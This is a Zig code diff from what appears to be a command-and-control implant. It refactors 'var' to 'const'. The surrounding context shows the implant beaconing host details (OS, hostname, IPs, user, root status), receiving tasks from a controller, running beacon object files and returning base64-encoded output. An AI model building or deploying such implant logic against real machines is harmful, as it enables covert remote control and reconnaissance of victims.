@@ -91,7 +91,7 @@ pub fn main() !u8 {
 
     // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
     const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');
-    var authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
+    const authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
     defer allocator.free(authz_b64);
     _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
     try heartbeat_header.append("Authorization", authz_b64);
@@ -135,9 +135,9 @@ pub fn main() !u8 {
             // bof - execute bof
             // cmd - execute builtin command (like: sleep 10)
             var root = parsed.value;
-            var task = root.object.get("name").?.string;
+            const task = root.object.get("name").?.string;
 
-            var request_id = root.object.get("id").?.string;
+            const request_id = root.object.get("id").?.string;
 
             var iter_task = std.mem.tokenize(u8, task, ":");
             const cmd_prefix = iter_task.next() orelse return error.BadData;
@@ -150,7 +150,7 @@ pub fn main() !u8 {
                 const bof_args_b64 = root.object.get("args").?.string;
                 const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
                 const len = try std.base64.Base64Decoder.calcSizeForSlice(&base64_decoder, bof_args_b64);
-                var bof_args = try allocator.alloc(u8, len);
+                const bof_args = try allocator.alloc(u8, len);
                 defer allocator.free(bof_args);
                 _ = try std.base64.Base64Decoder.decode(&base64_decoder, bof_args, bof_args_b64);
 
@@ -194,7 +194,7 @@ pub fn main() !u8 {
 
                 if (bof_context != null) if (bof_context.?.getOutput()) |bofOutput| {
                     stdout.writer().print("Bof output:\n{s}", .{bofOutput}) catch unreachable;
-                    var out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(bofOutput.len));
+                    const out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(bofOutput.len));
                     defer allocator.free(out_b64);
                     _ = std.base64.Base64Encoder.encode(&base64_encoder, out_b64, bofOutput);
 
